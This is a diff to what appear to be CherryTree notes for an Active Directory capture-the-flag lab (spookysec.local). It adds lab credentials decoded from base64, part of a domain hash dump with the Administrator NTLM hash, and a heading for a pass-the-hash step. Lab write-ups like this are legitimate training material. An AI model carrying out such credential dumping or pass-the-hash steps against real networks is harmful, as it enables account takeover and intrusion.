@@ -411,7 +411,7 @@ on converting it from base 64 :
       <codebox char_offset="83" justification="left" frame_width="90" frame_height="100" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cho YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw    | base64 -d
 backup@spookysec.local:backup2517860 </codebox>
     </node>
-    <node name="Dumping all hashes from the backup accoutn" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1673216065" ts_lastsave="1673217171">
+    <node name="Dumping all hashes from the backup accoutn" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1673216065" ts_lastsave="1673217211">
       <rich_text>
  </rich_text>
       <rich_text scale="h3">Dumping all the hashes from this account</rich_text>
@@ -419,7 +419,11 @@ backup@spookysec.local:backup2517860 </codebox>
 
 
 
-We can see the admin password at the be</rich_text>
+We can see the admin password at the beginning:
+```
+
+where the hash is </rich_text>
+      <rich_text family="monospace">0e0363213e37b94221497260b0bcb4fc</rich_text>
       <codebox char_offset="44" justification="left" frame_width="39" frame_height="53" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
 
 
@@ -502,6 +506,7 @@ ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:159c3fed5bdf63a4df6cdd028a89b161
 ATTACKTIVEDIREC$:des-cbc-md5:b686b94c1aa1a2f7
 [*] Cleaning up... 
 </codebox>
+      <codebox char_offset="99" justification="left" frame_width="39" frame_height="53" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::</codebox>
     </node>
     <node name="Pass the Hash Attack" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1673216338" ts_lastsave="1673216338"/>
   </node>
